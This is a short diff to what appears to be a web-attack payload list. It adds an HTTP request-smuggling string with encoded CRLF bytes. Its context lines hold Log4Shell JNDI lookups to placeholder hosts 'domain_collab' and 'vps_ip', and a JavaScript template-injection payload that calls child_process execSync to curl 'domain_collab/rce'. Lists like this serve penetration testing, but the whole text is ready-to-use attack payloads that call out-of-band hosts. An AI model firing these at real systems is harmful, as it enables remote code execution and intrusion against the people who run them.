@@ -1,3 +1,4 @@
+x\u0120HTTP/1.1\u010d\u010aHost:127.0.0.1\u010d\u010a\u010d\u010aGET\u0120/\u0120HTTP/1.1\u010d\u010aHost:domain_collab\u010d\u010a\u010d\u010aGET\u0120
 ${jndi:ldap://domain_collab/a}
 ${jndi:ldap://vps_ip:80/a}
 ){this.global.process.mainModule.require("child_process").execSync("curl domain_collab/rce")}; with(obj
